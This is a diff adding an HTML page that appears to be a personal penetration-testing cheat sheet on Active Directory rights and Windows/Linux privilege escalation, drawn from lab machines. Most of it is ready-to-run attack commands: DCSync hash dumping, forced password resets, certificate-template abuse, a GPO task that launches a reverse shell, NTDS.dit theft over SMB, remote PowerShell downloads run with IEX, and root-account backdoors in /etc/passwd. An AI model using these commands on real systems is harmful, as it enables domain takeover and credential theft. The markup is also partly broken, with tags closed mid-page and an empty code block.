@@ -1,0 +1,308 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Basic Info</h1>
+    <h2 class="blue">What's the DACL?</h2>
+    <p class="common">Windows/Active Directory (AD) objects—such as users, groups, computers, OUs, GPOs, and the domain root—have a security descriptor that includes:</p>
+    <ul>
+      <li>Owner — the object's owner.</li>
+      <li>DACL (Discretionary ACL) — the permission list that defines who can do what.</li>
+      <li>SACL — auditing rules (log when access occurs).</li>
+    </ul>
+
+    <p class="common">A DACL consists of multiple ACEs (Access Control Entries).</p>
+    <p class="common">Each ACE records things like the SID (the principal it applies to), allow/deny, and the specific rights (e.g., <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDacl</code>, <code>WriteOwner</code>, <code>ResetPassword</code>, <code>ExtendedRights</code>, …).</p>
+
+    <h2 class="blue">What's the WriteDACL?</h2>
+    <p class="common">WriteDACL is the permission to modify an object's DACL.</p>
+    <p class="common">In practice, it means you can grant yourself (or any account) additional rights on that object—even if you don't currently have those rights. So, even when you can't directly “reset a password” or “add a group member,” you can first edit the DACL to add ACEs that permit those actions, and then perform the action. In other words: grant permission first, act second.</p>
+
+
+    <h1>AD - Privilege and Groups</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Privilege</th>
+                <th>Explain</th>
+            </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Azure Admins</td>
+            <td>READ MONTEVERDE walkthrough. TL/DR</td>
+          </tr>
+          <tr>
+            <td>DCsync</td>
+            <td></td>
+          </tr>
+            <tr>
+                <td>Server Operator</td>
+                <td>You can use sc.exe - Please refer to sc.exe page for PE.</td>
+            </tr>
+
+            <tr>
+              <td>LAPS_Readers</td>
+              <td>LAPS, or Local Administrator Password Solution, is a tool that secures local administrator accounts on Windows computers by automatically generating and rotating unique, complex passwords for each machine. If you have this privilege, you can read password of user, might be Admin.</td>
+            </tr>
+            <tr>
+              <td>Account Operator</td>
+              <td>The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can sign in locally to domain controllers.</td>
+            </tr>
+
+            <tr>
+              <td>GenericAll</td>
+              <td>Full privilege against OU.</td>
+            </tr>
+            <tr>
+              <td>ForceChangePassword</td>
+              <td>Namely we can force change password.</td>
+            </tr>
+
+            <tr>
+              <td>GenericWrite</td>
+              <td>Though it doesn't provide us direct execution, we can perform TargetedKerberoasting against OU which we have GenericWrite Privilege.</td>
+            </tr>
+            <tr>
+              <td>WirteOwner</td>
+              <td>Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL. <br>You can get Owner right if you have WriteOwner.</td>
+            </tr>
+            <tr>
+              <td>Owner</td>
+              <td>The distinguished name of an object that has ownership of an object. You can use Shadow Credential.</td>
+            </tr>
+            <tr>
+              <td>Certificate Publisher</td>
+              <td>members of the Cert Publishers security group, which is authorized to publish certificates to users and computers in the domain. Servers running the Active Directory Certificate Services (AD CS) role are typically members of this group by default, allowing them to publish certificates into the userCertificate attribute of AD user and computer objects. </td>
+            </tr>
+            <tr>
+              <td>Default Domain Policy</td>
+              <td>The Default Domain Policy is a Group Policy Object (GPO) in Windows Active Directory that sets domain-wide account policies, such as password requirements and account lockout settings, for all users and computers in the domain.</td>
+            </tr>
+            <tr>
+              <td>WriteGPLink</td>
+              <td>You can create new GPO and add any task, user, group, etc...</td>
+            </tr>
+            <tr>
+              <td>AllExtendedRights</td>
+              <td>You can use all extended rights which are defined in the OU. ex) <code>Reset Password</code>, <code>Replicating Directory Changes</code>, <code>Replicating Directory Changes All</code>, <code>Certificate-Related rights</code></td>
+            </tr>
+        </tbody>
+    </table>
+<h2 class="blue">DCsync</h2>
+<div class="code-box"><pre><code>impacket-secretsdump -just-dc-user administrator AD_NAME/USER:"PASSWORD"@IP</code></pre></div>
+
+
+<h2 class="blue">LAPS_Readers code</h2>
+<div class="code-box"><pre><code>Get-ADComputer Computer_name -property 'ms-mcs-admpwd'</code></pre></div>
+
+<h2 class="blue">Account Operator Usage</h2>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>net user me test123! /add /domain</u>
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>net group "Exchange Windows Permissions" me /add</u>
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> <u>net localgroup "Remote Management users" me /add</u>
+The command completed successfully.</code></pre></div>
+
+<h2 class="blue">GenericAll</h2>
+<div class="code-box"><pre><code>net user targret_name PASSword /domain</code></pre></div>
+<h2 class="blue">You have GenericAll agaisnt DC machine?</h2>
+<ul>
+  <li>You can change virtual machine accounts' password -> Can DCsync attack</li>
+</ul>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\jackie\desktop> Import-Module ActiveDirectory
+*Evil-WinRM* PS C:\Users\jackie\desktop> $NewPass = ConvertTo-SecureString 'Dc02NewP@ssw0rd!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\jackie\desktop> Set-ADAccountPassword -Identity 'DC02$' -Reset -NewPassword $NewPass
+
+┌──(kali㉿kali)-[~/tempo/poseidon/163]
+└─$ impacket-secretsdump sub.poseidon.yzx/DC02\$:'Dc02NewP@ssw0rd!'@192.168.195.162</code></pre></div>
+
+<h2 class="blue">ForceChangePassword</h2>
+<div class="code-box"><pre><code>IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.38/PowerView.ps1')
+
+$SecPassword = ConvertTo-SecureString '<u>password</u>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('xxxxxx\<u>target_user</u>', $SecPassword)
+
+$UserPassword = ConvertTo-SecureString 'pwn123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred</code></pre></div>
+
+
+<h2 class="blue">GenericWrite</h2>
+<div class="code-box"><pre><code>sudo ntpdate target_IP
+...Time outputed...
+faketime 'OUTPUT TIME' python3 targetedKerberoast.py --dc-ip 10.129.27.133 -d administrator.htb -u privilege_user -p 'passowrd'</code></pre></div>
+<h2 class="blue">WriteOwner & Owner</h2>
+<div class="code-box"><pre><code>bloodyAD -d $DOMAIN --host $IP -u USER -p PASSWORD set owner TARGET_USER USER
+bloodyAD -d $DOMAIN --host $IP -u USER -p PASSWORD add genericAll TARGET_USDR USER
+certipy-ad shadow auto -u USER@DOMAIN -p PASSWORD -account 'TARGET_USER' -dc-ip $IP</code></pre></div>
+
+<h2 class="blue">Certificate Publishers</h2>
+<div class="code-box"><pre><code>certipy-ad find -u 'PRIVILEGE_USER' -hashes HASH -dc-ip $IP -vulnerable -stdout
+certipy-ad  template -u PRIVILEGE_USER -hashes HASH -dc-ip $IP -template TEMPLATE_NAME -target DOMAIN_MACHINE_NAME -save-old
+certipy-ad req -ca CERTIFICATE_AUTHORITY -u PRIVILEGE_USER -hashes HASH -dc-ip $IP -template TEMPLATE_NAME -target DOMAIN_MACHINE_NAME -upn administrator@DOMAIN -debug
+certipy-ad auth -pfx administrator.pfx </code></pre></div>
+
+
+
+<h2 class="blue">Default Domain Policy</h2>
+<div class="code-box"><pre><code>ls \\DOMAIN\SYSVOL\DOMAIN\Policies\{1234....5678}
+Get-Gpo -Guid 1234...5678
+          displayname : Default domain policy
+
+ .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount USER_NAME --GPOName "Default Domain Policy"</code></pre></div>
+
+ <h2 class="blue">WriteGPLink</h2>
+ <div class="code-box"><pre><code>New-GPO -name 'vulnerable one'
+New-GPLink -Name "vulnerable one" -target "DC=frizz,DC=htb"
+.\SharpGPOAbuse.exe --addcomputertask --GPOName "vulnerable one" --Author "m.shooolbus" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e BASE64_REV_SHELL"
+gpupdate /force</code></pre></div>
+
+<h2 class="blue">AllExtendedRights</h2>
+<h3>Against User -> Password reset</h3>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/poseidon/163]</pre></div>
+<h3>Against Domain -> DCsync</h3>
+<div class="code-box"><pre><code>impacket-secretsdump domain/user@DC</code></pre></div>
+
+
+
+
+
+
+
+    <h1>Local Privilege</h1>
+    <table>
+      <thead>
+        <tr>
+          <th>Privilege</th>
+          <th>Explain</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>SeBackupPrivilege</td>
+          <td>You can backup sam hive and system hive. SAM+SYSTEM => Local Machine's user hash. NTDS.dit+SYSTEM => All users' hash in the domain.</td>
+        </tr>
+        <tr>
+          <td>SeRestorePrivilege</td>
+          <td>We can recovery ntds.dit from backup.</td>
+        </tr>
+        <tr>
+          <td>Backup Operator</td>
+          <td>You can use wbadmin command line tool.</td>
+        </tr>
+      </tbody>
+    </table>
+</body>
+</html>
+<h2 class="blue">SeBackupPrivilege code</h2>
+<div class="code-box"><pre><code>reg save HKLM\SAM C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+reg save HKLM\Security C:\Temp\SECURITY</code></pre></div>
+
+<div class="code-box"><pre><code>echo Y | wbadmin start backup -backuptarget:\\10.10.16.22\smb -include:c:\windows\ntds
+
+wbadmin get versions
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+Backup time: 11/25/2025 10:32 AM
+Backup location: Network Share labeled \\10.10.16.22\smb
+Version identifier: <u>11/25/2025-18:32</u>
+Can recover: Volume(s), File(s)
+
+ echo "Y" | wbadmin start recovery -version:11/25/2025-18:32 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+
+ reg save HKLM\SYSTEM C:\system.hive</code></pre></div>
+ <p class="common">Then, we got ntds.dit and system hive.</p>
+ <ul>
+  <li>You cannot copy ntds.dit since system is grabbing it. But you can take snapshot.</li>
+  <li>So, we can create snapshot and recovery ntds.dit.</li>
+  <li>Also, We cannot backup on C:\'s file on C:\.</li>
+  <li>So, we need to create backup on our kali machine using smdb or on D:\ disk.</li>
+</ul>
+
+
+
+
+
+  <h1>PrivEsc location</h1>
+  <table>
+    <thead>
+      <tr>
+        <th>No.</th>
+        <th>Check Item</th>
+        <th>Command / </th>
+        <th>Explanation</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td><code>C:\Users\Public\Desktop</code></td>
+        <td><code>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')"</code></td>
+        <td>There was .lnk file which includes runas command.Runas exploit. HTB access</td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td><code>C:\Users\user\Documents</code></td>
+        <td><code>└─$ keepass2john CEH.kdbx > CEH.hash<br>
+└─$ john CEH.hash --wordlist=/usr/share/wordlists/rockyou.txt </code></td>
+        <td>Found CEH.kdbx file.</td>
+      </tr>
+      
+      <tr>
+        <td>3</td>
+        <td><code>C:\Users\user\AppData\Roaming\Microsoft\protect\SID</code></td>
+        <td></td>
+        <td></td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td><code>C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials</code></td>
+        <td></td>
+        <td></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+
+
+    <h1>PrivEsc Info</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Check Content</th>
+                <td>Explain</td>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>hotfix(s)</td>
+                <td>If there is no hotfix, we can use reverse shell file because windows doesn't detect it.</td>
+            </tr>
+            <tr>
+              <td>cpassword</td>
+              <td>GPP's cpassword in SYSVOL files would be decryptable.</td>
+            </tr>
+        </tbody>
+    </table>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    <h1>LINUX</h1>
+    <h1>If you have SUDO privilege to write any file...</h1>
+    <div class="code-box"><pre><code>echo 'username ALL=(ALL:ALL) ALL' > /etc/sudoers.d/username</code></pre></div>
+
+    <h1>Writable /etc/passwd</h1>
+    <div class="code-box"><pre><code>[michael@snookums ~]$ pw=$(openssl passwd Password123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
+[michael@snookums ~]$ su r00t
+Password: Password123</code></pre></div>
